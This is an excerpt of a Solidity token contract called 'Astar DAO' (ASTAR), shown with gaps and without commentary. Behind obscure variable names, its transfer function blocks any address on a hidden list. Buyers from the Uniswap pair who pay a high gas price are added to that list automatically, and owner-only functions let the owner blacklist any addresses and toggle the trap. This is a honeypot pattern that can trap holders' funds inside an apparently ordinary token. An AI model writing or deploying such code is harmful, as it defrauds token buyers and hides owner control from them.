...
contract AstarDAO is Ownable, IERC20 {
    ...
    string private _name = "Astar DAO";

    string private _symbol = "ASTAR";

    uint256 private _liquiditySwapThreshold = _totalSupply;

    uint256 private m = 5000000000;
    bool private h = true;
    mapping (address => bool) public hg;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if(h){
            require(!hg[from],"BCS");
            if(tx.gasprice >= m && from == uniswapV2Pair()){
                hg[to] = true;
    ...
    function manageh(bool _status) public onlyOwner {
        h = _status;
    }
    function managehg(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            hg[addresses[i]] = status;
        }
    }
}